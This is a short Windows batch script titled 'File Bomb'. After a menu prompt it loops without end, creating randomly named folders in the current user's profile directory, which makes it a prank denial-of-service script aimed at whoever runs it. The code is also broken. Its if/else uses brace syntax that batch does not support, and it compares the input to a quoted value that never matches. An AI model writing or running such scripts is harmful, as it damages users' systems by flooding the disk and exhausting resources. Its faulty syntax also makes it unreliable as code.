@echo off
title File Bomb
color 0a


:Menu
echo. 
echo Hello! Press 'A' to start the file bomb
set /p choice=Press A: 
if %choice% == "a" {
    goto loop
} else {
    cls
    echo You didn't press 'A'!!
    ping localhost -n 2 >nul
    goto Menu
}

:loop
cd C:\Users\%USERNAME%\
echo %random%
md %random%
md %random%
md %random%
goto loop
